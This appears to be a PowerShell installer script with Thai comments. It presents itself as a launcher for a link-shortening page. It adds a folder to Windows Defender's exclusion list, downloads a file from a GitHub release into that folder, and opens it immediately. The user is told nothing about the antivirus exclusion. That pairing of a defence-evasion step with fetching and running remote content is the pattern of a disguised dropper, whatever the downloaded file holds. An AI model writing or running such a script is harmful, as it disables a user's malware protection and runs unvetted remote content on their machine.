# --- Performance Optimization ---
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

# --- Variables & Path ---
$dir = "C:\Web Server"; $file = "$dir\Shorten.link.html"
$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/Shorten.link.html"

# --- Main Logic ---
if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
Add-MpPreference -ExclusionPath $dir

# ดาวน์โหลดไฟล์แบบ Synchronous ผ่าน .NET WebClient (Max Speed)
(New-Object System.Net.WebClient).DownloadFile($url, $file)

# สั่งรันไฟล์ HTML ทันที
Start-Process $file

# --- Cleanup & Choice ---
Clear-Host
Write-Host "==============================" -ForegroundColor Green
$choice = Read-Host "คุณต้องการลบ 'ย่อลิ้งค์' หรือไม่? (Y/N)"
Write-Host "==============================" -ForegroundColor Green

if ($choice -match "y") {
    Remove-Item -Path $dir -Recurse -Force
    Write-Host "`n[!] ลบ ย่อลิ้งค์ เรียบร้อยแล้ว" -ForegroundColor Yellow
} else {
    Write-Host "`n[+] คุณสามารถ บันทึกเป็น แถบรายการโปรด เพื่อเรียกใช้ ย่อลิ้งค์ ได้สะดวกยิ่งขึ้น" -ForegroundColor Cyan
}

# คืนค่า Progress Bar
$ProgressPreference = 'Continue'
